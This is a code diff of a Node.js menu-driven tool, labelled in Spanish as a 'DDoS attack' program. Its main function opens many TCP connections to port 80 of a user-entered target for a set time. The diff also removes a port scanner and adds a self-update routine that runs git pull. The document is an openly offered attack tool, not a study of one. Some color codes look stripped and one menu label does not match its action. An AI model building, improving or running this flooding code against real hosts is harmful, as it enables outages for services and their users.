@@ -1,39 +1,59 @@
 const net = require('net');
+const rl = require('readline').createInterface({
+input: process.stdin,
+output: process.stdout
+});
 
-const portScan = async (target) => {
-try {
-console.log('[36m Iniciando escaneo de puertos...');
-const ports = [];
-for (let i = 1; i <= 100; i++) {
-const socket = new net.Socket();
-socket.connect(i, target, () => {
-console.log('[32m Puerto abierto: ${i}');
-ports.push(i);
-});
-socket.on('error', (err) => {
-//console.error('Error: ${err}');
-});
-}
-console.log('[36m Escaneo de puertos finalizado. Puertos abiertos: ${ports.join(', ')});
-} catch (error) {
-console.error('Error: ${error}');
-}
+const colors = {
+reset: '[0m',
+bright: '[1m',
+dim: '[2m',
+underscore: '[4m',
+blink: '[5m',
+reverse: '[7m',
+hidden: '[8m',
+fg: {
+black: '[30m',
+red: '[31m',
+green: '[32m',
+yellow: '[33m',
+blue: '[34m',
+magenta: '[35m',
+cyan: '[36m',
+white: '[37m',
+},
+bg: {
+black: '[40m',
+red: '[41m',
+green: '[42m',
+yellow: '[43m',
+blue: '[44m',
+magenta: '[45m',
+cyan: '[46m',
+white: '[47m',
+},
 };
 
-const ddosAttack = async (target, port, numConnections, attackDuration) => {
+const decorations = {
+underline: '[4m',
+bold: '[1m',
+italic: '[3m',
+};
+
+const ddosAttack = async (url, numConnections, attackDuration) => {
 try {
-console.log('[36m Iniciando ataque DDoS...');
+console.log(`[36m Iniciando ataque DDoS...`);
 const sockets = [];
 for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
-socket.connect(port, target, () => {
-console.log('[31m Conectado a ${target}:${port}');
+socket.connect(80, url, () => {
+console.log(`[31m Conectado a ${url}`);
 });
 socket.on('data', (data) => {
-console.log('Dato recibido de ${target}:${port}');
+console.log(`Dato recibido de ${url}`);
 });
 socket.on('error', (err) => {
-console.error('Error: ${err}');
+console.error(`Error: ${err}`);
 });
 sockets.push(socket);
 }
@@ -43,7 +63,23 @@ console.log('Ataque finalizado');
 sockets.forEach((socket) => socket.destroy());
 }, attackDuration * 1000);
 } catch (error) {
-console.error('Error: ${error}');
+console.error(`Error: ${error}`);
+}
+};
+
+const updateCode = async () => {
+try {
+console.log(`[36m Actualizando código...`);
+const exec = require('child_process').exec;
+exec('git pull origin main', (error, stdout, stderr) => {
+if (error) {
+console.error(`Error: ${error}`);
+} else {
+console.log(`[36m Código actualizado correctamente!`);
+}
+});
+} catch (error) {
+console.error(`Error: ${error}`);
 }
 };
 
@@ -51,39 +87,71 @@ const showMenu = () => {
 console.clear(); // Limpiar la consola
 console.log('[31m         DDoS attack    ');
 console.log('⭐️ Desarrollado por Keiji821');
-console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺');
-console.log('1. Iniciar ataque DDoS');
-console.log('2. Escanear puertos abiertos');
-console.log('3. Actualizar código');
-console.log('4. Salir');
+console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
+console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
+console.log('[34m ︳2. Actualizar código                  ︳');
+console.log('[36m ︳3. Configurar conexiones simultaneas  ︳');
+console.log('[33m ︳4. Aumentar potencia del ataque       ︳');
+console.log('[31m ︳5. Salir                              ︳');
+console.log('[36m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍');
+rl.setPrompt('[37m  🌐➤ '); // Establecer el texto de la casilla "Opción: "
+rl.prompt(); // Mostrar la casilla "Opción:"
+};
 
-rl.question('Seleccione una opción: ', (answer) => {
-switch (answer) {
+let numConnections = 100; // Número de conexiones simultaneas por defecto
+let attackDuration = 60; // Duración del ataque por defecto
+
+showMenu(); // Mostrar el menú principal al inicio
+
+rl.on('line', (option) => {
+switch (option.trim()) {
 case '1':
-rl.question('Ingrese la dirección IP o dominio del objetivo: ', (target) => {
-rl.question('Ingrese el puerto del objetivo: ', (port) => {
-rl.question('Ingrese el número de conexiones: ', (numConnections) => {
-rl.question('Ingrese la duración del ataque (en segundos): ', (attackDuration) => {
-ddosAttack(target, port, numConnections, attackDuration);
-});
-});
+console.log('Ingrese la URL del objetivo: ');
+rl.question('URL: ', (url) => {
+if (url === '') {
+console.log('URL invalida');
+showMenu();
+} else {
+ddosAttack(url, numConnections, attackDuration);
+showMenu(); // Volver a mostrar el menú principal
+}
 });
 break;
 case '2':
-rl.question('Ingrese la dirección IP o dominio del objetivo: ', (target) => {
-portScan(target);
-});
+updateCode();
+showMenu(); // Volver a mostrar el menú principal
 break;
 case '3':
-updateCode();
+console.log('Ingrese el número de conexiones simultaneas: ');
+rl.question('Conexiones: ', (conexiones) => {
+if (conexiones === '') {
+console.log('Valor invalido');
+showMenu();
+} else {
+numConnections = parseInt(conexiones);
+console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
+showMenu(); // Volver a mostrar el menú principal
+}
+});
 break;
 case '4':
+console.log('Ingrese la duración del ataque (en segundos): ');
+rl.question('Duración: ', (duration) => {
+if (duration === '') {
+console.log('Valor invalido');
+showMenu();
+} else {
+attackDuration = parseInt(duration);
+console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
+showMenu(); // Volver a mostrar el menú principal
+}
+});
+break;
+case '5':
 console.log('Saliendo...');
 process.exit();
 break;
-default:
-console.log('Opción inválida. Intente nuevamente.');
-showMenu();
 }
+}).on('close', () => {
+process.exit();
 });
-};
